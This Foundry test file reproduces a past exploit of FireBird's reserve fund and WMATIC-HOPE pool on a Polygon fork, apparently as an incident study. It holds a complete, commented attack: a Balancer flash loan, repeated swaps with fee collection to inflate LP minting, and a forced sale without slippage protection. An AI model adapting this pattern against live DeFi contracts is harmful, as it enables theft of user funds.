// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~8536 MATIC (This tx exploit 3211 MATIC)
// Attacker : https://polygonscan.com/address/0x8e83cd1bad00cf933b86214aaaab4db56abf68aa
// Attack Contract : https://polygonscan.com/address/0x22b1a115b16395e5ebd50f4f82aef3a159e1c6d1
// Vulnerable Contract : https://polygonscan.com/address/0x5e9cd0861f927adeccfeb2c0124879b277dd66ac
// Attack Tx : https://polygonscan.com/tx/0x96d80c609f7a39b45f2bb581c6ba23402c20c2b6cd528317692c31b8d3948328


interface IFireBirdRouter {
    function swapExactTokensForTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        uint8[] memory dexIds,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IFirebirdReserveFund {
    function collectFeeFromProtocol() external;
    function sellTokensToUsdc() external;
}

interface IFireBirdPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IHOPE is IERC20 {
    function transferFrom(address holder, address recipient, uint256 amount) external returns (bool);
}

interface IProxyUSDC is IUSDC {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ContractTest is Test {
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH WMATIC = IWETH(payable(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270));
    IFireBirdRouter Router = IFireBirdRouter(0xb31D1B1eA48cE4Bf10ed697d44B747287E785Ad4);
    IFirebirdReserveFund ReserveFund = IFirebirdReserveFund(0x5D53C9F5017198333C625840306D7544516618e4);
    IFireBirdPair FLP = IFireBirdPair(0x5E9cd0861F927ADEccfEB2C0124879b277Dd66aC);
    IFireBirdPair ce2c_FBP = IFireBirdPair(0xCe2cB67b11ec0399E39AF20433927424f9033233);
    IProxyUSDC USDC = IProxyUSDC(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IHOPE HOPE = IHOPE(0xd78C475133731CD54daDCb430F7aAE4F03C1E660);
    uint256 amount = 286_000_000_000_000_000_000_000;

    function setUp() public {
        vm.createSelectFork("polygon", 48_149_138 - 1);
        vm.label(address(Balancer), "Balancer");
        vm.label(address(WMATIC), "WMATIC");
        vm.label(address(USDC), "USDC");
        vm.label(address(HOPE), "HOPE");
        vm.label(address(Router), "Router");
        vm.label(address(ReserveFund), "ReserveFund");
        vm.label(address(FLP), "FLP");
        vm.label(address(ce2c_FBP), "ce2c_FBP");
        approveAll();
    }

    function testExploit() external {
        uint256 startMATIC = WMATIC.balanceOf(address(this));
        console.log("Before Start: %d MATIC", startMATIC);

        address[] memory tokens = new address[](1);
        tokens[0] = address(WMATIC);
        uint256[] memory amounts = new uint[](1);
        amounts[0] = amount;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        uint256 intRes = WMATIC.balanceOf(address(this)) / 1 ether;
        uint256 decRes = WMATIC.balanceOf(address(this)) - intRes * 1e18;
        console.log("Attack Exploit: %s.%s MATIC", intRes, decRes);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        for (uint256 i = 0; i < 3; i++) {
            WMATIC_HOPE_PairSwap();
        }
        WMATIC.transfer(address(Balancer), amount);
    }

    function WMATIC_HOPE_PairSwap() internal returns (uint256) {
        uint256 amountIn = 226_000_000_000_000_000_000_000;
        uint256 secAmount = routerSwap(address(WMATIC), address(USDC), amount - amountIn, 1, address(ce2c_FBP), 1); // swap WMATIC to USDC
        for (uint256 i = 0; i < 3; i++) {
            amountIn = routerSwap(address(WMATIC), address(HOPE), amountIn, 1, address(FLP), 1); // swap WMATIC to HOPE, deflate HOPE reserve in WMATIC-HOPE LP
            ReserveFund.collectFeeFromProtocol(); // collect fee from protocol, burn WMATIC-HOPE LP, sent WMATIC to 'FirebirdReserveFund', a large amount of WMATIC-HOPE LP mint through manipulated mintLiquidityFee() function
            amountIn = routerSwap(address(HOPE), address(WMATIC), amountIn, 1, address(FLP), 1); // swap HOPE to WMATIC back
        }
        ReserveFund.sellTokensToUsdc(); // 'FirebirdReserveFund' swap WMATIC to USDC without slippage protection
        routerSwap(address(USDC), address(WMATIC), secAmount, 1, address(ce2c_FBP), 1); // swap USDC to WMATIC back
        return amountIn;
    }

    function routerSwap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address path,
        uint8 dexId
    ) internal returns (uint256) {
        address[] memory paths = new address[](1);
        paths[0] = path;
        uint8[] memory dexIds = new uint8[](1);
        dexIds[0] = dexId;

        uint256[] memory results = new uint[](2);
        results = Router.swapExactTokensForTokens(
            tokenIn, tokenOut, amountIn, amountOutMin, paths, dexIds, address(this), type(uint256).max
        );
        return results[1];
    }

    function approveAll() internal {
        WMATIC.approve(address(Router), type(uint256).max);
        WMATIC.approve(address(FLP), type(uint256).max);
        WMATIC.approve(address(ce2c_FBP), type(uint256).max);
        USDC.approve(address(FLP), type(uint256).max);
        USDC.approve(address(ce2c_FBP), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        HOPE.approve(address(Router), type(uint256).max);
        HOPE.approve(address(FLP), type(uint256).max);
        HOPE.approve(address(this), type(uint256).max);
    }
}
